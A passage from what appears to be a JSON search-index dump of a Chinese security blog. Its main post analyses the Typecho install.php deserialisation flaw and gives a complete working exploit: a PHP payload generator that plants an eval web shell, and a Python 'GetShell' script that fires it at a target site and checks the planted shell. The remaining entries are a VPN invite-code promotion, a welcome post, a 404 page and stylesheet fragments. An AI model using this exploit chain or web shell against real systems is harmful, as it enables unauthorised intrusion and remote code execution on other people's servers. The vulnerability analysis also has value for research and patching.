class=\"string\">'&lt;updated&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/updated&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;published&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/published&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;author&gt;</span></div><div class=\"line\"><span class=\"string\">    &lt;name&gt;'</span> . $item[<span class=\"string\">'author'</span>]-&gt;screenName . <span class=\"string\">'&lt;/name&gt;</span></div><div class=\"line\"><span class=\"string\">    &lt;uri&gt;'</span> . $item[<span class=\"string\">'author'</span>]-&gt;url . <span class=\"string\">'&lt;/uri&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/author&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div></pre></td></tr></table></figure></p>\n<h2 id=\"Request-php\"><a href=\"#Request-php\" class=\"headerlink\" title=\"Request.php\"></a>Request.php</h2><p>Typecho_Request实例调用__get魔术方法，进入get方法,最后进入_applyFilter方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get($key);</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<p>$key的值是screenNamem,<br>因此<code>$this-&gt;_params</code>需要是个键为screenNamem的数组，键值为想执行的代码,<br>最终$value传进call_user_func<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($key, $default = NULL)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">switch</span> (<span class=\"keyword\">true</span>) &#123;</div><div class=\"line\">            <span class=\"keyword\">case</span> <span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;_params[$key]):</div><div class=\"line\">                $value = <span class=\"keyword\">$this</span>-&gt;_params[$key];</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">            <span class=\"keyword\">case</span> <span class=\"keyword\">isset</span>(<span class=\"keyword\">self</span>::$_httpParams[$key]):</div><div class=\"line\">                $value = <span class=\"keyword\">self</span>::$_httpParams[$key];</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">            <span class=\"keyword\">default</span>:</div><div class=\"line\">                $value = $default;</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class=\"number\">0</span> ? $value : $default;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;_applyFilter($value);</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<p>进入_applyFilter后,可以看见 call_user_func，<br>这时需要设置<code>$this-&gt;_filter</code>为arrsert，作为call_user_func的第一个参数，<br>$value我们也可控，已经可以执行任意代码<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_applyFilter</span><span class=\"params\">($value)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;_filter) &#123;</div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_filter <span class=\"keyword\">as</span> $filter) &#123;</div><div class=\"line\">                $value = is_array($value) ? array_map($filter, $value) :</div><div class=\"line\">                call_user_func($filter, $value);</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">$this</span>-&gt;_filter = <span class=\"keyword\">array</span>();</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span> $value;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><p>主要用于生成__typecho_config 的Payload<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"><span class=\"comment\">* Created by PhpStorm.</span></div><div class=\"line\"><span class=\"comment\">* Date: 2017/11/03</span></div><div class=\"line\"><span class=\"comment\">* Time: 9:17</span></div><div class=\"line\"><span class=\"comment\">* 生成 _typecho_config 的值</span></div><div class=\"line\"><span class=\"comment\">*/</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Feed</span></span></div><div class=\"line\"><span class=\"class\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">const</span> RSS2 = <span class=\"string\">'RSS 2.0'</span>;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_type;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_charset;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_lang;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_items = <span class=\"keyword\">array</span>();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($version, $type = self::RSS2, $charset = <span class=\"string\">'UTF-8'</span>, $lang = <span class=\"string\">'en'</span>)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_version = $version;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_type = $type;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_charset = $charset;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_lang = $lang;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addItem</span><span class=\"params\">(array $item)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_items[] = $item;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Request</span></span></div><div class=\"line\"><span class=\"class\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_params = <span class=\"keyword\">array</span>(<span class=\"string\">'screenName'</span>=&gt;<span class=\"string\">'fputs(fopen(\\'./usr/themes/default/img/c.php\\',\\'w\\'),\\'&lt;?php @eval($_POST[a]);?&gt;\\')'</span>);</div><div class=\"line\">    <span class=\"keyword\">private</span> $_filter = <span class=\"keyword\">array</span>(<span class=\"string\">'assert'</span>);</div><div class=\"line\">    <span class=\"comment\">//private $_filter = array('assert', array('Typecho_Response', 'redirect'));</span></div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">$payload1 = <span class=\"keyword\">new</span> Typecho_Feed(<span class=\"number\">5</span>, <span class=\"string\">'ATOM 1.0'</span>);</div><div class=\"line\">$payload2 = <span class=\"keyword\">new</span> Typecho_Request();</div><div class=\"line\">$payload1-&gt;addItem(<span class=\"keyword\">array</span>(<span class=\"string\">'author'</span> =&gt; $payload2));</div><div class=\"line\">$exp[<span class=\"string\">'adapter'</span>] = $payload1;</div><div class=\"line\">$exp[<span class=\"string\">'prefix'</span>] = <span class=\"string\">'Rai4over'</span>;</div><div class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure></p>\n<h1 id=\"编写payload的简单思路\"><a href=\"#编写payload的简单思路\" class=\"headerlink\" title=\"编写payload的简单思路\"></a>编写payload的简单思路</h1><p>最外层$exp是数组，数组中的’adapter’是Typecho_Feed的实例$payload1,<br>$payload1的构造参数是’ATOM 1.0’用于控制分支,<br>$payload2是Typecho_Request的实例,<br><code>private $_filter</code> ，<code>private $_params</code>是传给call_user_func的参数，也就是通过assert写shell<br>然后$payload2通过additem添加到$payload的<code>$_items</code>的变量中<br>最后把$payload1添加到最外层的$exp数组中<br>ps：因为install.php中有ob_start();所以构造好是没有回显的，但是也能写shell<br>后面其他师傅说可以用Typecho_Response类中的redirect方法中的exit()得到回显</p>\n<h1 id=\"GetShell小工具\"><a href=\"#GetShell小工具\" class=\"headerlink\" title=\"GetShell小工具\"></a>GetShell小工具</h1><p>记得把php添加进环境变量<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'''</span></div><div class=\"line\"><span class=\"string\">    Www.ChaBug.Org</span></div><div class=\"line\"><span class=\"string\">    '''</span></div><div class=\"line\"></div><div class=\"line\">    targert_url = <span class=\"string\">'http://www.xxxx.com'</span>;</div><div class=\"line\"></div><div class=\"line\">    rsp = requests.get(targert_url + <span class=\"string\">\"/install.php\"</span>);</div><div class=\"line\">    <span class=\"keyword\">if</span> rsp.status_code != <span class=\"number\">200</span>:</div><div class=\"line\">        exit(<span class=\"string\">'The attack failed and the problem file does not exist !!!'</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'You are lucky, the problem file exists, immediately attack !!!'</span></div><div class=\"line\"></div><div class=\"line\">    proxies = &#123;<span class=\"string\">\"http\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>, <span class=\"string\">\"https\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>, &#125;</div><div class=\"line\"></div><div class=\"line\">    typecho_config = os.popen(<span class=\"string\">'php exp.php'</span>).read()</div><div class=\"line\"></div><div class=\"line\">    headers = &#123;<span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</div><div class=\"line\">              <span class=\"string\">'Cookie'</span>: <span class=\"string\">'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config=&#123;typecho_config&#125;;'</span>.format(typecho_config=typecho_config),</div><div class=\"line\">              <span class=\"string\">'Referer'</span>: targert_url&#125;</div><div class=\"line\"></div><div class=\"line\">    url = targert_url + <span class=\"string\">\"/install.php?finish=1\"</span></div><div class=\"line\"></div><div class=\"line\">    requests.get(url,headers=headers,allow_redirects=<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">    shell_url = targert_url + <span class=\"string\">'/usr/themes/default/img/c.php'</span></div><div class=\"line\">    <span class=\"keyword\">if</span> requests.get(shell_url).status_code == <span class=\"number\">200</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'shell_url: '</span> + shell_url</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Getshell Fail!\"</span></div></pre></td></tr></table></figure></p>\n<p>PS:代码仅用于学习研究，请勿用于非法用途恶意攻击，否则后果作者概不负责。</p>\n","categories":[],"tags":[]},{"title":"SSR分享-你的翻墙利器","url":"http://www.chabug.org/2017/11/02/ssr-share/","content":"<h1 id=\"前奏\"><a href=\"#前奏\" class=\"headerlink\" title=\"前奏\"></a>前奏</h1><p>你是不是仍然被国内的网络环境所困扰？看这里！</p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p><a href=\"https://www.myshenwang.tk\" target=\"_blank\" rel=\"external\">神网加速器 www.myshenwang.tk</a></p>\n<p>注册初始10G每次签到100-1024MB有1新加坡2日本3美国2香港</p>\n<h1 id=\"教程\"><a href=\"#教程\" class=\"headerlink\" title=\"教程\"></a>教程</h1><p><a href=\"https://www.myshenwang.tk/auth/register\" target=\"_blank\" rel=\"external\">注册链接点我</a></p>\n<p>在邀请码一栏填上下面的邀请码，注册成功后登陆使用ssr链接即可。</p>\n<h1 id=\"邀请码\"><a href=\"#邀请码\" class=\"headerlink\" title=\"邀请码\"></a>邀请码</h1><table>\n<thead>\n<tr>\n<th>序号</th>\n<th>邀请码</th>\n<th>状态</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>6288</td>\n<td>hK6UZq9BrHH0iTAvip521eCMFttMwhRU</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6299</td>\n<td>5lmXcqjvLIpGj8gKb4zo1RyBvjoqWufo</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6300</td>\n<td>QKsPTYrx2ABFwVIm1u6H5qjlFzSjXhGz</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6301</td>\n<td>uU9xa21YqQZE50n5NrdC2b7Z1xzGLjum</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6302</td>\n<td>yk0ZZAztnYRCcySLK4r5N2TnrCSZeLl0</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6303</td>\n<td>e5ByTbMzPEzzPzMUEDXnM5Lrf4ack5sH</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6304</td>\n<td>G7GBhz7o3MXriSRBd7rn4rZbalKTmlRL</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6305</td>\n<td>bqfOYHRy3hwMYU4aXHDtFyODzoj3xagh</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6306</td>\n<td>4IoEp6HA1F8fJMuY7Yak85abmfgtW96P</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6298</td>\n<td>6ZWhCbTOUtPtvZpfJ5wXUzCggbtQq92v</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6297</td>\n<td>aN57NidnLPhCC029rdKntOXpm2hXyJ0t</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6289</td>\n<td>BnKZC2UPwtdkijcZ8mcmLTDHQkw3OUsQ</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6290</td>\n<td>ir3TusS25CgqO4jN2rNSNisN3sSHO6En</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6291</td>\n<td>OysGSD2ilb0FJS90NHXHUoXFCQBEuXvp</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6292</td>\n<td>UU9lg2Pnkij9Ld9dv7vvr4SZofvhiiIB</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6293</td>\n<td>OtzQlHzeNQkzSrgim6wl5xbcywoow5eg</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6294</td>\n<td>UFx8zln6Rvc4t7ghaIm4e36UHCWh2EfH</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6295</td>\n<td>ghHJq8VpNGoOFBm0X21poWMEWCF5t7Zx</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6296</td>\n<td>3IM1TMzw9D6RYi27lKI8pxkwm1GP1Piq</td>\n<td>可用</td>\n</tr>\n<tr>\n<td>6307</td>\n<td>ZXwGYBwCex4sgDORWd7QyeThDVNsvfx3</td>\n<td>可用</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"返利\"><a href=\"#返利\" class=\"headerlink\" title=\"返利\"></a>返利</h1><p>注意！邀请码请给认识的需要的人。<br>邀请有记录，若被邀请的人违反用户协议，您将会有连带责任。<br>邀请码暂时无法购买，请珍惜。</p>\n<p>您每拉一位用户注册，可以获得<code>3G</code>流量奖励；当 TA 充值时还可获得 TA 充值金额的 <code>20 %</code>的提成。</p>\n","categories":[],"tags":[]},{"title":"Hello world","url":"http://www.chabug.org/2017/11/02/hello/","content":"<h1 id=\"前因\"><a href=\"#前因\" class=\"headerlink\" title=\"前因\"></a>前因</h1><p>妈卖批，前几天服务器<code>GG</code>了，如此穷逼的我们连服务器都续费不起，现在没办法，折腾了一晚上，把博客挂到了GitHub。<br>我也很无奈啊。不过也让我学会了怎么用Git+hexo做博客，收获还是有的。</p>\n<hr>\n<h1 id=\"以前\"><a href=\"#以前\" class=\"headerlink\" title=\"以前\"></a>以前</h1><p>以前的文章虽然数据什么的都保存了，但是没有服务器<code>买不起</code>，<del>我也就准备一篇文章一篇文章搬过来了。</del><br>搬个鸡儿，太麻烦了。</p>\n<hr>\n<h1 id=\"现在\"><a href=\"#现在\" class=\"headerlink\" title=\"现在\"></a>现在</h1><p>重新搭起了Hexo，打算重新开始 :)<br>使用<a href=\"https://github.com/forsigner/fexo\" target=\"_blank\" rel=\"external\">fexo</a>主题<br>没评论系统，没有找到好用的第三方评论系统，近期<strong>可能</strong>会加上disqus。<br><a href=\"https://github.com/fancyapps/fancybox\" target=\"_blank\" rel=\"external\">fancybox</a>，<a href=\"https://github.com/rstacruz/nprogress\" target=\"_blank\" rel=\"external\">nprogress</a>，<a href=\"https://github.com/EYHN/hexo-helper-live2d\" target=\"_blank\" rel=\"external\">live2d</a>效果以后可能会加。</p>\n<h1 id=\"未来\"><a href=\"#未来\" class=\"headerlink\" title=\"未来\"></a>未来</h1><p>我正在上大一，记得高中老师说，高中紧，大学就松了，都是骗子，我最近忙的要死，天天满课。</p>\n<p>团队中的几位小弟弟@饭饭 差不多都是高三党，@二黑 正忙于工作，每个人都有每个人的事情。</p>\n<p>我不能说保证文章每天的更新，但是我一定保证文章的质量。感谢各位一直相伴ChaBug。</p>\n<hr>\n<h1 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h1><p>没什么好说的。<br>希望大家心想事成。</p>\n<hr>\n<p>2017/11/2   初遇亲笔</p>\n","categories":[],"tags":[]},{"title":"404","url":"http://www.chabug.org/404.html","content":"<!DOCTYPE html>\n<html lang=\"zh\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>404Page Not Found</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n        <style>\n            * {\n                margin: 0;\n                line-height: 1.5;\n            }\n            html {\n                color: #888;\n                font-family: \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n                text-align: center;\n            }\n            body {\n                left: 50%;\n                margin: -43px 0 0 -150px;\n                position: absolute;\n                top: 20%;\n                width: 300px;\n            }\n            h1 {\n                color: #555;\n                font-size: 2em;\n                font-weight: 400;\n            }\nimg {\n    width: 100%;\n}\n            p {\n                line-height: 1.2;\n            }\n            @media only screen and (max-width: 270px) {\n                body {\n                    margin: 10px auto;\n                    position: static;\n                    width: 95%;\n                }\n                h1 {\n                    font-size: 1.5em;\n                }\n            }\n        </style>\n    </head>\n    <body>\n     <img src=\"https://cdn.dribbble.com/users/492116/screenshots/1667059/thrillist-404.gif\" alt=\"\">\n        <p>页面不存在或被管理员删除， <span id=\"totalSecond\">3</span>秒后自动返回首页</p>\n    </body>\n<script language=\"javascript\" type=\"text/javascript\">\n<!--\n    var second = document.getElementById('totalSecond').textContent;\n    if (navigator.appName.indexOf(\"Explorer\") > -1)  //判断是IE浏览器还是Firefox浏览器，采用相应措施取得秒数\n    {\n        second = document.getElementById('totalSecond').innerText;\n    } else\n    {\n        second = document.getElementById('totalSecond').textContent;\n    }\n    setInterval(\"redirect()\", 1000);  //每1秒钟调用redirect()方法一次\n    function redirect()\n    {\n        if (second < 0)\n        {\n            location.href = 'http://www.chabug.org/';\n        } else\n        {\n            if (navigator.appName.indexOf(\"Explorer\") > -1)\n            {\n                document.getElementById('totalSecond').innerText = second--;\n            } else\n            {\n                document.getElementById('totalSecond').textContent = second--;\n            }\n        }\n    }\n-->\n</script>\n</html>\n<!-- IE requires 512+ bytes: http://www.404-error-page.com/404-error-page-too-short-problem-microsoft-ie.shtml -->\n","categories":[],"tags":[]},{"title":"","url":"http://www.chabug.org/css/personal-style.css","content":"@font-face {\n  font-family: \"Meiryo\";\n  src: url(\"/fonts/Meiryo.eot\");\n  /* IE9 */\n  src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n  url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n  url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n  url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n  /* iOS 4.1- */\n  font-style: normal;\n  font-weight: normal;\n}\nhtml.page-home {\n  /*background-image: url('/images/bg.jpg')*/\n  /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n  /*background-blend-mode: screen;*/\n  /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n}\n","categories":[],"tags":[]},{"title":"关于","url":"http://www.chabug.org/about/index.html","content":"","categories":[],"tags":[]},{"title":"友链","url":"http://www.chabug.org/link/index.html","content":"","categories":[],"tags":[]},{"title":"Project","url":"http://www.chabug.org/project/index.html","content":"","categories":[],"tags":[]},{"title":"搜索","url":"http://www.chabug.org/search/index.html","content":"","categories":[],"tags":[]}]